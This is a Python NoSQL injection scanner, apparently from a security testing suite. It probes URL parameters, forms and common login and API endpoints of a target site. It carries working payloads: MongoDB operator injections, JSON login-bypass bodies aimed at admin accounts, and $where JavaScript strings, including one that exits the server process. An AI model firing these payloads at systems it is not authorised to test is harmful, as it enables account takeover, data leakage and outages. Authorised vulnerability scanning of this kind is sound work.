#!/usr/bin/env python3
"""
VaultScan - NoSQL Injection Scanner
=====================================
Tests URL parameters, form inputs, and JSON API endpoints for NoSQL injection
vulnerabilities. Covers MongoDB operator injection, authentication bypass,
$where injection, and error-based detection for MongoDB, CouchDB, and Cassandra.

Outputs JSON array of findings to stdout.
"""

import json
import re
import sys
import os
import time
from typing import Dict, List, Tuple, Any
from urllib.parse import urljoin, urlparse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from scan_utils import (
    is_mock_mode,
    output_findings,
    base_argparser,
    normalize_url,
    create_session,
    safe_request,
    make_finding,
    crawl_same_domain,
    extract_forms,
    extract_url_params,
    replace_url_param,
)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
CATEGORY = "NOSQL_INJECTION"
MAX_CRAWL_PAGES = 5
RESPONSE_DIFF_THRESHOLD = 0.15  # 15% length difference = injection likely worked
TESTABLE_INPUT_TYPES = {"text", "search", "hidden", "password", "email", "url", "tel", "number"}

# ---------------------------------------------------------------------------
# NoSQL Error Patterns — (regex, db_type)
# ---------------------------------------------------------------------------
NOSQL_ERROR_PATTERNS: List[Tuple[str, str]] = [
    # MongoDB
    (r"MongoError", "MongoDB"),
    (r"MongoDB\s+Server\s+Error", "MongoDB"),
    (r"mongo\..*?Error", "MongoDB"),
    (r"E11000 duplicate key", "MongoDB"),
    (r"\$where.*?not.*?allowed", "MongoDB"),
    (r"SyntaxError.*?unexpected.*?token", "MongoDB"),
    (r"ReferenceError.*?not defined", "MongoDB"),
    (r"MongoServerError", "MongoDB"),
    (r"MongoParseError", "MongoDB"),
    (r"BSONTypeError", "MongoDB"),
    (r"Cannot apply.*?\$\w+.*?to", "MongoDB"),
    (r"unknown operator.*?\$", "MongoDB"),
    (r"BadValue", "MongoDB"),
    (r"command\s+failed.*?errmsg", "MongoDB"),
    # CouchDB
    (r"CouchDB", "CouchDB"),
    (r"couchdb", "CouchDB"),
    (r"reason.*?syntax_error", "CouchDB"),
    (r"error.*?not_found", "CouchDB"),
    (r"compilation_error", "CouchDB"),
    # Cassandra
    (r"CassandraException", "Cassandra"),
    (r"cassandra\..*?Error", "Cassandra"),
    (r"SyntaxException", "Cassandra"),
    (r"InvalidRequest", "Cassandra"),
    (r"com\.datastax", "Cassandra"),
    # Generic NoSQL
    (r"nosql", "Generic NoSQL"),
    (r"JsonParseException", "Generic NoSQL"),
    (r"org\.bson", "MongoDB"),
]

# ---------------------------------------------------------------------------
# MongoDB Operator Payloads for URL Parameters
# ---------------------------------------------------------------------------
URL_OPERATOR_PAYLOADS: List[Tuple[str, str]] = [
    # URL-encoded MongoDB operator injection
    ("[$gt]=", "MongoDB $gt operator"),
    ("[$ne]=", "MongoDB $ne operator"),
    ("[$gte]=", "MongoDB $gte operator"),
    ("[$lt]=", "MongoDB $lt operator"),
    ("[$regex]=.*", "MongoDB $regex operator"),
    ("[$exists]=true", "MongoDB $exists operator"),
    ("[$in][]=admin", "MongoDB $in operator"),
    ("[$nin][]=x", "MongoDB $nin operator"),
]

# ---------------------------------------------------------------------------
# MongoDB $where Injection Payloads
# ---------------------------------------------------------------------------
WHERE_PAYLOADS: List[str] = [
    "1; return true",
    "1; return this.constructor.constructor('return process')().exit()",
    "' || 1==1",
    "'; return true; var x='",
    "this.password.match(/.*/)",
    "function(){return true}",
    "1 || 1==1",
    "'; sleep(5000); var x='",
]

# ---------------------------------------------------------------------------
# JSON Body Payloads for Auth Bypass
# ---------------------------------------------------------------------------
AUTH_BYPASS_PAYLOADS: List[Tuple[Dict, str]] = [
    (
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
        "MongoDB $gt auth bypass",
    ),
    (
        {"username": {"$ne": ""}, "password": {"$ne": ""}},
        "MongoDB $ne auth bypass",
    ),
    (
        {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
        "MongoDB $regex auth bypass",
    ),
    (
        {"username": {"$exists": True}, "password": {"$exists": True}},
        "MongoDB $exists auth bypass",
    ),
    (
        {"username": "admin", "password": {"$ne": ""}},
        "MongoDB admin $ne password bypass",
    ),
    (
        {"username": {"$regex": "^admin"}, "password": {"$gt": ""}},
        "MongoDB admin regex with $gt password bypass",
    ),
    (
        {"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$gt": ""}},
        "MongoDB $in operator auth bypass",
    ),
]

# ---------------------------------------------------------------------------
# Common API Endpoints likely backed by MongoDB
# ---------------------------------------------------------------------------
MONGO_API_ENDPOINTS: List[str] = [
    "/api/users",
    "/api/login",
    "/api/auth",
    "/api/auth/login",
    "/api/auth/signin",
    "/api/search",
    "/api/products",
    "/api/items",
    "/api/data",
    "/api/v1/users",
    "/api/v1/login",
    "/api/v1/auth",
    "/api/v1/search",
    "/api/v2/users",
    "/api/v2/auth",
    "/login",
    "/signin",
    "/auth/login",
    "/users/login",
    "/graphql",
]


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def get_baseline_response(session, method: str, url: str, timeout: int,
                          data=None, json_body=None, headers=None) -> Tuple:
    """Get a baseline response for comparison."""
    kwargs = {"timeout": timeout}
    if data:
        kwargs["data"] = data
    if json_body:
        kwargs["json"] = json_body
    if headers:
        kwargs["headers"] = headers
    resp, err = safe_request(session, method, url, **kwargs)
    if err or resp is None:
        return None, 0, ""
    return resp, len(resp.text), resp.text


def response_differs(baseline_len: int, test_len: int) -> bool:
    """Check if response length differs significantly from baseline."""
    if baseline_len == 0 and test_len == 0:
        return False
    max_len = max(baseline_len, test_len, 1)
    diff_ratio = abs(baseline_len - test_len) / max_len
    return diff_ratio > RESPONSE_DIFF_THRESHOLD


def check_nosql_errors(body: str) -> List[Tuple[str, str]]:
    """Check response body for NoSQL error indicators. Returns list of (matched_text, db_type)."""
    results = []
    seen_dbs = set()
    for pattern, db_type in NOSQL_ERROR_PATTERNS:
        if db_type in seen_dbs:
            continue
        match = re.search(pattern, body, re.IGNORECASE)
        if match:
            results.append((match.group(0)[:200], db_type))
            seen_dbs.add(db_type)
    return results


# ---------------------------------------------------------------------------
# 1. Test MongoDB Operator Injection in URL Parameters
# ---------------------------------------------------------------------------
def test_url_param_operators(
    session, url: str, delay: float, timeout: int
) -> List[Dict]:
    """Test URL parameters for MongoDB operator injection."""
    findings: List[Dict] = []
    params = extract_url_params(url)
    if not params:
        return findings

    for param, values in params.items():
        original_value = values[0] if values else ""

        # Get baseline response
        baseline_resp, baseline_len, baseline_body = get_baseline_response(
            session, "GET", url, timeout
        )
        if baseline_resp is None:
            continue

        for payload_suffix, description in URL_OPERATOR_PAYLOADS:
            # Build modified URL with operator injection
            injected_url = replace_url_param(url, param, payload_suffix)
            time.sleep(delay)

            resp, err = safe_request(session, "GET", injected_url, timeout=timeout)
            if err or resp is None:
                continue

            body = resp.text
            resp_len = len(body)

            # Check for error messages revealing NoSQL backend
            errors = check_nosql_errors(body)
            for matched_text, db_type in errors:
                findings.append(make_finding(
                    vulnerability=f"NoSQL Injection - Error Disclosure ({db_type})",
                    severity="HIGH",
                    location=f"{url} [param: {param}]",
                    evidence=(
                        f"Payload '{payload_suffix}' in parameter '{param}' "
                        f"triggered {db_type} error: {matched_text}"
                    ),
                    category=CATEGORY,
                    raw_details={
                        "technique": "operator-injection-error",
                        "parameter": param,
                        "payload": payload_suffix,
                        "db_type": db_type,
                        "matched_text": matched_text,
                        "status_code": resp.status_code,
                    },
                ))

            # Check if response differs (operator was processed)
            if response_differs(baseline_len, resp_len) and resp.status_code == 200:
                # Also ensure the baseline was not a redirect or error
                if baseline_resp.status_code == 200:
                    findings.append(make_finding(
                        vulnerability=f"NoSQL Operator Injection ({description})",
                        severity="HIGH",
                        location=f"{url} [param: {param}]",
                        evidence=(
                            f"Payload '{payload_suffix}' in parameter '{param}' "
                            f"produced a different response (baseline={baseline_len}, "
                            f"injected={resp_len}), suggesting the operator was processed"
                        ),
                        category=CATEGORY,
                        raw_details={
                            "technique": "operator-injection-diff",
                            "parameter": param,
                            "payload": payload_suffix,
                            "description": description,
                            "baseline_length": baseline_len,
                            "response_length": resp_len,
                            "status_code": resp.status_code,
                        },
                    ))
                    break  # One confirmed finding per param is enough

    return findings


# ---------------------------------------------------------------------------
# 2. Test Authentication Bypass via NoSQL Operators (JSON body)
# ---------------------------------------------------------------------------
def test_auth_bypass(
    session, target: str, delay: float, timeout: int
) -> List[Dict]:
    """Test common auth endpoints for NoSQL authentication bypass."""
    findings: List[Dict] = []
    auth_endpoints = [
        ep for ep in MONGO_API_ENDPOINTS
        if any(kw in ep for kw in ("login", "auth", "signin"))
    ]

    for endpoint in auth_endpoints:
        url = urljoin(target, endpoint)
        time.sleep(delay)

        # Get baseline with normal credentials
        normal_creds = {"username": "testuser_nosql_probe", "password": "testpass_nosql_probe"}
        baseline_resp, baseline_len, baseline_body = get_baseline_response(
            session, "POST", url, timeout,
            json_body=normal_creds,
            headers={"Content-Type": "application/json"},
        )
        # If endpoint doesn't exist, skip
        if baseline_resp is None:
            continue
        if baseline_resp.status_code in (404, 405):
            continue

        baseline_status = baseline_resp.status_code

        for payload_body, description in AUTH_BYPASS_PAYLOADS:
            time.sleep(delay)

            resp, err = safe_request(
                session, "POST", url, timeout=timeout,
                json=payload_body,
                headers={"Content-Type": "application/json"},
            )
            if err or resp is None:
                continue

            body = resp.text
            resp_len = len(body)

            # Check for NoSQL errors
            errors = check_nosql_errors(body)
            for matched_text, db_type in errors:
                findings.append(make_finding(
                    vulnerability=f"NoSQL Injection - Auth Endpoint Error ({db_type})",
                    severity="HIGH",
                    location=url,
                    evidence=(
                        f"JSON payload for '{description}' triggered {db_type} "
                        f"error: {matched_text}"
                    ),
                    category=CATEGORY,
                    raw_details={
                        "technique": "auth-bypass-error",
                        "endpoint": url,
                        "payload": json.dumps(payload_body),
                        "description": description,
                        "db_type": db_type,
                        "status_code": resp.status_code,
                    },
                ))

            # Check for auth bypass indicators
            # If baseline was 401/403 and injection gets 200, or response contains
            # tokens/session data that baseline did not
            bypass_indicators = [
                "token", "jwt", "session", "access_token", "auth_token",
                "sessionId", "logged_in", "success", "welcome",
            ]
            if (
                baseline_status in (401, 403, 400)
                and resp.status_code == 200
            ):
                findings.append(make_finding(
                    vulnerability="NoSQL Authentication Bypass",
                    severity="CRITICAL",
                    location=url,
                    evidence=(
                        f"JSON payload for '{description}' changed response "
                        f"from {baseline_status} to {resp.status_code}, "
                        f"indicating authentication bypass"
                    ),
                    category=CATEGORY,
                    raw_details={
                        "technique": "auth-bypass",
                        "endpoint": url,
                        "payload": json.dumps(payload_body),
                        "description": description,
                        "baseline_status": baseline_status,
                        "injected_status": resp.status_code,
                    },
                ))
                return findings  # Critical finding, stop testing

            # Check if response differs and contains auth-related keywords
            if response_differs(baseline_len, resp_len):
                body_lower = body.lower()
                found_indicators = [ind for ind in bypass_indicators if ind.lower() in body_lower]
                baseline_lower = baseline_body.lower()
                new_indicators = [
                    ind for ind in found_indicators
                    if ind.lower() not in baseline_lower
                ]
                if new_indicators:
                    findings.append(make_finding(
                        vulnerability="Potential NoSQL Authentication Bypass",
                        severity="HIGH",
                        location=url,
                        evidence=(
                            f"JSON payload for '{description}' produced a different "
                            f"response containing auth indicators: {new_indicators}"
                        ),
                        category=CATEGORY,
                        raw_details={
                            "technique": "auth-bypass-diff",
                            "endpoint": url,
                            "payload": json.dumps(payload_body),
                            "description": description,
                            "new_indicators": new_indicators,
                            "baseline_length": baseline_len,
                            "response_length": resp_len,
                        },
                    ))
                    break  # One finding per endpoint is sufficient

    return findings


# ---------------------------------------------------------------------------
# 3. Test $where Injection
# ---------------------------------------------------------------------------
def test_where_injection(
    session, url: str, delay: float, timeout: int
) -> List[Dict]:
    """Test URL parameters for MongoDB $where injection."""
    findings: List[Dict] = []
    params = extract_url_params(url)
    if not params:
        return findings

    for param, values in params.items():
        original_value = values[0] if values else ""

        # Get baseline
        baseline_resp, baseline_len, _ = get_baseline_response(
            session, "GET", url, timeout
        )
        if baseline_resp is None:
            continue

        for payload in WHERE_PAYLOADS:
            test_url = replace_url_param(url, param, payload)
            time.sleep(delay)

            resp, err = safe_request(session, "GET", test_url, timeout=timeout)
            if err or resp is None:
                continue

            body = resp.text
            resp_len = len(body)

            # Check for errors indicating $where was processed
            errors = check_nosql_errors(body)
            for matched_text, db_type in errors:
                findings.append(make_finding(
                    vulnerability=f"NoSQL $where Injection ({db_type})",
                    severity="CRITICAL",
                    location=f"{url} [param: {param}]",
                    evidence=(
                        f"$where payload '{payload}' in parameter '{param}' "
                        f"triggered {db_type} error: {matched_text}"
                    ),
                    category=CATEGORY,
                    raw_details={
                        "technique": "where-injection",
                        "parameter": param,
                        "payload": payload,
                        "db_type": db_type,
                        "matched_text": matched_text,
                        "status_code": resp.status_code,
                    },
                ))
                break  # One error per payload is enough

            # Check if tautology payload changed response
            if payload in ("1; return true", "' || 1==1", "1 || 1==1"):
                if response_differs(baseline_len, resp_len) and resp.status_code == 200:
                    findings.append(make_finding(
                        vulnerability="NoSQL $where Injection - Tautology",
                        severity="CRITICAL",
                        location=f"{url} [param: {param}]",
                        evidence=(
                            f"$where tautology payload '{payload}' in parameter "
                            f"'{param}' produced a different response "
                            f"(baseline={baseline_len}, injected={resp_len})"
                        ),
                        category=CATEGORY,
                        raw_details={
                            "technique": "where-injection-tautology",
                            "parameter": param,
                            "payload": payload,
                            "baseline_length": baseline_len,
                            "response_length": resp_len,
                        },
                    ))
                    break  # One finding per param

    return findings


# ---------------------------------------------------------------------------
# 4. Test MongoDB Operator Injection in Search/Filter Params
# ---------------------------------------------------------------------------
def test_search_filter_injection(
    session, target: str, delay: float, timeout: int
) -> List[Dict]:
    """Test common API endpoints for MongoDB operator injection in query/filter params."""
    findings: List[Dict] = []
    search_endpoints = [
        ep for ep in MONGO_API_ENDPOINTS
        if any(kw in ep for kw in ("search", "users", "products", "items", "data"))
    ]

    filter_payloads = [
        ({"filter": {"$gt": ""}}, "filter parameter $gt"),
        ({"q": {"$regex": ".*"}}, "search parameter $regex"),
        ({"search": {"$ne": ""}}, "search parameter $ne"),
        ({"where": {"$exists": True}}, "where parameter $exists"),
        ({"query": {"$gt": ""}}, "query parameter $gt"),
    ]

    for endpoint in search_endpoints:
        url = urljoin(target, endpoint)
        time.sleep(delay)

        # Check if endpoint exists with a normal GET
        resp_check, err_check = safe_request(session, "GET", url, timeout=timeout)
        if err_check or resp_check is None:
            continue
        if resp_check.status_code == 404:
            continue

        baseline_len = len(resp_check.text)

        # Test with operator-injected query params via POST JSON
        for payload_body, description in filter_payloads:
            time.sleep(delay)

            resp, err = safe_request(
                session, "POST", url, timeout=timeout,
                json=payload_body,
                headers={"Content-Type": "application/json"},
            )
            if err or resp is None:
                # Also try GET with query string
                continue

            body = resp.text
            resp_len = len(body)

            errors = check_nosql_errors(body)
            for matched_text, db_type in errors:
                findings.append(make_finding(
                    vulnerability=f"NoSQL Filter Injection ({db_type})",
                    severity="HIGH",
                    location=url,
                    evidence=(
                        f"Payload for '{description}' triggered {db_type} "
                        f"error: {matched_text}"
                    ),
                    category=CATEGORY,
                    raw_details={
                        "technique": "filter-injection",
                        "endpoint": url,
                        "payload": json.dumps(payload_body),
                        "description": description,
                        "db_type": db_type,
                        "status_code": resp.status_code,
                    },
                ))

            # Check for data leakage via operator injection
            if resp.status_code == 200 and response_differs(baseline_len, resp_len):
                if resp_len > baseline_len:
                    findings.append(make_finding(
                        vulnerability="NoSQL Operator Injection - Data Leakage",
                        severity="HIGH",
                        location=url,
                        evidence=(
                            f"Payload for '{description}' returned more data than "
                            f"expected (baseline={baseline_len}, injected={resp_len})"
                        ),
                        category=CATEGORY,
                        raw_details={
                            "technique": "filter-injection-data-leak",
                            "endpoint": url,
                            "payload": json.dumps(payload_body),
                            "description": description,
                            "baseline_length": baseline_len,
                            "response_length": resp_len,
                        },
                    ))
                    break

    return findings


# ---------------------------------------------------------------------------
# 5. Test Forms for NoSQL Injection
# ---------------------------------------------------------------------------
def test_forms_nosql(
    session, url: str, html: str, delay: float, timeout: int
) -> List[Dict]:
    """Test form inputs for NoSQL operator injection."""
    findings: List[Dict] = []
    forms = extract_forms(url, html)

    form_payloads = [
        ('{"$gt":""}', "MongoDB $gt in form field"),
        ('{"$ne":""}', "MongoDB $ne in form field"),
        ('{"$regex":".*"}', "MongoDB $regex in form field"),
        ('{"$exists":true}', "MongoDB $exists in form field"),
        ("[$gt]=", "URL-style $gt in form field"),
        ("[$ne]=", "URL-style $ne in form field"),
    ]

    for form in forms:
        action = form.get("action", url)
        method = form.get("method", "GET").upper()
        inputs = form.get("inputs", [])

        for inp in inputs:
            inp_type = inp.get("type", "text").lower()
            if inp_type not in TESTABLE_INPUT_TYPES:
                continue

            inp_name = inp.get("name", "")
            if not inp_name:
                continue

            # Build base form data
            base_data: Dict[str, str] = {}
            for other in inputs:
                other_name = other.get("name", "")
                if other_name == inp_name or not other_name:
                    continue
                base_data[other_name] = other.get("value", "") or "test"

            # Get baseline
            baseline_data = {**base_data, inp_name: "normalvalue123"}
            if method == "POST":
                baseline_resp, baseline_len, _ = get_baseline_response(
                    session, "POST", action, timeout, data=baseline_data
                )
            else:
                baseline_resp, baseline_len, _ = get_baseline_response(
                    session, "GET", action, timeout, data=baseline_data
                )
            if baseline_resp is None:
                continue

            for payload, description in form_payloads:
                form_data = {**base_data, inp_name: payload}
                time.sleep(delay)

                if method == "POST":
                    resp, err = safe_request(
                        session, "POST", action, timeout=timeout, data=form_data
                    )
                else:
                    resp, err = safe_request(
                        session, "GET", action, timeout=timeout, params=form_data
                    )

                if err or resp is None:
                    continue

                body = resp.text
                resp_len = len(body)

                # Check for NoSQL errors
                errors = check_nosql_errors(body)
                for matched_text, db_type in errors:
                    findings.append(make_finding(
                        vulnerability=f"NoSQL Injection in Form ({db_type})",
                        severity="HIGH",
                        location=f"{action} [form field: {inp_name}]",
                        evidence=(
                            f"Payload '{payload}' in form field '{inp_name}' "
                            f"({method}) triggered {db_type} error: {matched_text}"
                        ),
                        category=CATEGORY,
                        raw_details={
                            "technique": "form-injection",
                            "form_action": action,
                            "form_method": method,
                            "field": inp_name,
                            "payload": payload,
                            "db_type": db_type,
                            "status_code": resp.status_code,
                        },
                    ))
                    break

                # Check response difference
                if response_differs(baseline_len, resp_len) and resp.status_code == 200:
                    findings.append(make_finding(
                        vulnerability=f"NoSQL Injection in Form ({description})",
                        severity="HIGH",
                        location=f"{action} [form field: {inp_name}]",
                        evidence=(
                            f"Payload '{payload}' in form field '{inp_name}' "
                            f"({method}) produced a different response "
                            f"(baseline={baseline_len}, injected={resp_len})"
                        ),
                        category=CATEGORY,
                        raw_details={
                            "technique": "form-injection-diff",
                            "form_action": action,
                            "form_method": method,
                            "field": inp_name,
                            "payload": payload,
                            "description": description,
                            "baseline_length": baseline_len,
                            "response_length": resp_len,
                        },
                    ))
                    break  # One finding per input field

    return findings


# ---------------------------------------------------------------------------
# 6. Test Common API Endpoints for MongoDB Backend
# ---------------------------------------------------------------------------
def test_api_endpoints(
    session, target: str, delay: float, timeout: int
) -> List[Dict]:
    """Probe common API endpoints with NoSQL payloads to detect MongoDB backends."""
    findings: List[Dict] = []

    api_probe_payloads = [
        ({"$gt": ""}, "MongoDB $gt probe"),
        ({"$where": "1"}, "MongoDB $where probe"),
        ([{"$match": {}}], "MongoDB aggregation probe"),
    ]

    for endpoint in MONGO_API_ENDPOINTS:
        url = urljoin(target, endpoint)
        time.sleep(delay)

        # Quick check if endpoint exists
        resp_check, err_check = safe_request(session, "GET", url, timeout=timeout)
        if err_check or resp_check is None:
            continue
        if resp_check.status_code == 404:
            continue

        for payload_body, description in api_probe_payloads:
            time.sleep(delay)

            resp, err = safe_request(
                session, "POST", url, timeout=timeout,
                json=payload_body,
                headers={"Content-Type": "application/json"},
            )
            if err or resp is None:
                continue

            body = resp.text
            errors = check_nosql_errors(body)
            for matched_text, db_type in errors:
                findings.append(make_finding(
                    vulnerability=f"NoSQL Backend Detected ({db_type})",
                    severity="MEDIUM",
                    location=url,
                    evidence=(
                        f"API probe '{description}' at {endpoint} triggered "
                        f"{db_type} error: {matched_text}"
                    ),
                    category=CATEGORY,
                    raw_details={
                        "technique": "api-probe",
                        "endpoint": url,
                        "payload": json.dumps(payload_body) if isinstance(payload_body, (dict, list)) else str(payload_body),
                        "description": description,
                        "db_type": db_type,
                        "matched_text": matched_text,
                        "status_code": resp.status_code,
                    },
                ))
                break  # One error per payload

    return findings


# ---------------------------------------------------------------------------
# 7. Check for NoSQL Error Messages in Crawled Pages
# ---------------------------------------------------------------------------
def test_error_disclosure(
    session, url: str, html: str, delay: float, timeout: int
) -> List[Dict]:
    """Check page content for NoSQL/MongoDB/CouchDB/Cassandra error indicators."""
    findings: List[Dict] = []

    errors = check_nosql_errors(html)
    for matched_text, db_type in errors:
        findings.append(make_finding(
            vulnerability=f"NoSQL Error Disclosure ({db_type})",
            severity="MEDIUM",
            location=url,
            evidence=(
                f"Page contains {db_type} error indicator: {matched_text}"
            ),
            category=CATEGORY,
            raw_details={
                "technique": "error-disclosure",
                "url": url,
                "db_type": db_type,
                "matched_text": matched_text,
            },
        ))

    return findings


# ---------------------------------------------------------------------------
# Mock Findings
# ---------------------------------------------------------------------------
def get_mock_findings(target: str) -> List[Dict]:
    """Return a realistic mock finding for NoSQL injection."""
    return [
        make_finding(
            vulnerability="NoSQL Authentication Bypass",
            severity="CRITICAL",
            location=f"{target}/api/login",
            evidence=(
                "JSON payload for 'MongoDB $ne auth bypass' changed response "
                "from 401 to 200, indicating authentication bypass. "
                "Payload: {\"username\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}"
            ),
            category=CATEGORY,
            raw_details={
                "technique": "auth-bypass",
                "endpoint": f"{target}/api/login",
                "payload": '{"username":{"$ne":""},"password":{"$ne":""}}',
                "description": "MongoDB $ne auth bypass",
                "baseline_status": 401,
                "injected_status": 200,
            },
        ),
    ]


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main() -> None:
    parser = base_argparser("VaultScan - NoSQL Injection Scanner")
    args = parser.parse_args()

    target = normalize_url(args.target)

    # ---- Mock mode ----
    if is_mock_mode():
        output_findings(get_mock_findings(target))
        return

    # ---- Live scan ----
    session = create_session(timeout=args.timeout, cookies=args.cookies, headers=args.headers)
    delay = args.delay
    timeout = args.timeout
    findings: List[Dict] = []

    # Step 1: Crawl same-domain pages
    try:
        pages = crawl_same_domain(
            target, session, delay=delay, timeout=timeout,
            max_pages=MAX_CRAWL_PAGES, depth=args.crawl_depth,
        )
    except Exception:
        pages = [target]

    # Step 2: Test each crawled page
    for page_url in pages:
        # Fetch page HTML
        resp, err = safe_request(session, "GET", page_url, timeout=timeout)
        page_html = resp.text if resp else ""

        # 2a: Test URL parameters for operator injection
        findings.extend(test_url_param_operators(session, page_url, delay, timeout))

        # 2b: Test $where injection in URL parameters
        findings.extend(test_where_injection(session, page_url, delay, timeout))

        # 2c: Test forms for NoSQL injection
        if page_html:
            findings.extend(test_forms_nosql(session, page_url, page_html, delay, timeout))
            # 2d: Check for error disclosure in page content
            findings.extend(test_error_disclosure(session, page_url, page_html, delay, timeout))

    # Step 3: Test authentication bypass on common endpoints
    findings.extend(test_auth_bypass(session, target, delay, timeout))

    # Step 4: Test common API endpoints for MongoDB operator injection
    findings.extend(test_search_filter_injection(session, target, delay, timeout))

    # Step 5: Probe API endpoints for NoSQL backend detection
    findings.extend(test_api_endpoints(session, target, delay, timeout))

    # Deduplicate findings by (vulnerability, location)
    seen = set()
    unique_findings: List[Dict] = []
    for f in findings:
        key = (f["vulnerability"], f["location"])
        if key not in seen:
            seen.add(key)
            unique_findings.append(f)

    output_findings(unique_findings)


if __name__ == "__main__":
    main()
